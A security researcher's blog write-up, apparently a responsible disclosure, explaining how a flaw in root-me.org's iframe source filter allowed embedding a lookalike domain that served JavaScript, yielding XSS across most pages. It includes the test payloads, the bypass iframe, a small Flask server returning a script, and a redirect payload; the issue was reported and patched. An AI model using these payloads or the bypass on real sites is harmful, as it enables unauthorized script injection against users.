---
source: kevin-mizu
source_url: https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org
title: "How I was able to rick roll every users on root-me.org | mizu.re"
description: "How I was able to rick roll every users on root-me.org"
---

_keyboard\_arrow\_up_

title: How I was able to rick roll every users on root-me.org

date: Mar 27, 2022

tags: [Article](https://mizu.re/tag/Article) [Web](https://mizu.re/tag/Web)

# How I was able to rick roll every users on root-me.org

- [Introduction](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org#introduction)
- [Recon](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org#recon)
- [My first iframe](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org#my_first_iframe)
- [XSS](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org#xss)
- [Further tests](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org#further_tests)

## Introduction

Few weeks ago, I decided to try to find a vulnerability on the platform that taught me a lot in cybersecurity: [Root-Me](https://root-me.org/). In that way, I started to search in the input box which is used for the following:

- ChatBox (Present on all pages)
- User's informations
- Challenges solutions
- New challenges requests
- ...

![input_box](https://mizu.re/articles/articles/vuln01_rootme/images/input_box.png)

Moreover, this input box is also special, it allows you to use HTML and custom text descriptor to render your input.

## Recon

After trying a lot of different HTML element, I learnt the following :

- You can't use javascript, a lot of it seems to be filtered. For example:

Input:

```html
<script>alert()</script>
<img src=x onerror="alert()">
<a href="javascript:alert()">XSS</a>
```

Ouput:

```html
<code class="echappe-js">&lt;script&gt;alert()&lt;/script&gt;</code>
<p>
    <code class="echappe-js">&lt;img src=x onerror="alert()"&gt;</code>
    <br class="autobr">
    <a>XSS</a>
</p>
```

- It is possible to load iframes.

```html
<iframe>
```

![iframe01](https://mizu.re/articles/articles/vuln01_rootme/images/iframe01.png)

With both information, an idea came to my mind. What if it was possible to embed a js file that I can control? I would be able to bypass all the restriction!

```html
<iframe src="https://mizu.re/xss.js">
```

![iframe02](https://mizu.re/articles/articles/vuln01_rootme/images/iframe02.png)

Unfortunatly, the src attribute seems to be automatically removed. As a last try, I embed my own profile page.

```html
<iframe src="https://www.root-me.org/Mizu">
```

![iframe03](https://mizu.re/articles/articles/vuln01_rootme/images/iframe03.png)

This time, the result was different, I achieve embedding the www.root-me.org domain, but csp seems to block us from rendering the page.

![csp](https://mizu.re/articles/articles/vuln01_rootme/images/csp.png)

However, it is important to notice that it is possible to render every site that we want. Then, finding a way to bypass filter on the back, will allow us to easily have an XSS.

```csp
frame-src http://* https://*
```

## My first iframe

Having no possibility to embed the www.root-me.org domain due to the CSP, I started thinking that the filter was allowing me to embed only root-me.org origin. But after some tries, I figured out that I was wrong because it is not possible to iframe challenge01.root-me.org XSS challenges 👀

At this point, I had a lot of interesting things:

- I can iframe all the website I want, thanks to the CSP.
- [https://www.root-me.org/mizu](https://www.root-me.org/mizu) was working.
- challenge01.root-me.org was not working

With that information, I understand something really important for the future tries : www.root-me.org domain must be used.

In order to verify my assumption, I embedded api.www.root-me.org:

```html
<iframe src="https://api.www.root-me.org/">
```

![iframe04](https://mizu.re/articles/articles/vuln01_rootme/images/iframe04.png)

## XSS

Well, I've got my first iframe, it seems to be nothing because I can't get an XSS on the api domain and you're right, but what if I could do the opposite ?

```html
<iframe src="https://www.root-me.org.x/">
```

![iframe05](https://mizu.re/articles/articles/vuln01_rootme/images/iframe05.png)

Seeing that it worked, I immediately claimed www.root-me.org.mizu.re domain and start a flask server. (with https to avoid mixed content error)

```py
from flask import Flask

# Create the APP
app = Flask(__name__)

# Home page
@app.route("/", methods=["GET"])
def index():
    return "<script>alert(document.domain)</script>"

if __name__ == "__main__":
    app.run("0.0.0.0", port=443, ssl_context=("cert/server.crt", 'cert/server.key'))
```

```html
<iframe src="https://www.root-me.org.mizu.re/">
```

![xss01](https://mizu.re/articles/articles/vuln01_rootme/images/xss01.png)

Et voila ! 🎉

## Further tests

Immediately after finding the XSS, I've contacted [@podalirius](https://twitter.com/podalirius_) who helped me to make some tests and report the vulnerability.

![xss02](https://mizu.re/articles/articles/vuln01_rootme/images/xss02.png)

![xss03](https://mizu.re/articles/articles/vuln01_rootme/images/xss03.png)

As you can see, the vulnerability was impacting the most pages of the website. For example, an attacker could have used it to rick roll each person going to the www.root-me.org domain using:

```html
<script>
    window.top.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
</script>
```

## Patch

After further researches from root-me team, the problem has been fixed by the following code patch:

![patch](https://mizu.re/articles/articles/vuln01_rootme/images/patch.png)

Sometimes, critical vulnerabilities can arise for a simple slash!

Thanks to Root Me for patching quickly the vulnerability and authorizing me to post this article!

![report](https://mizu.re/articles/articles/vuln01_rootme/images/report.png)

![badges](https://mizu.re/articles/articles/vuln01_rootme/images/badges.png)

Thanks for reading! 👋

[_keyboard\_arrow\_left_ MC Players](https://mizu.re/post/mc_players)

[XML is love, XML is life _keyboard\_arrow\_right_](https://mizu.re/post/xml-is-love-is-life)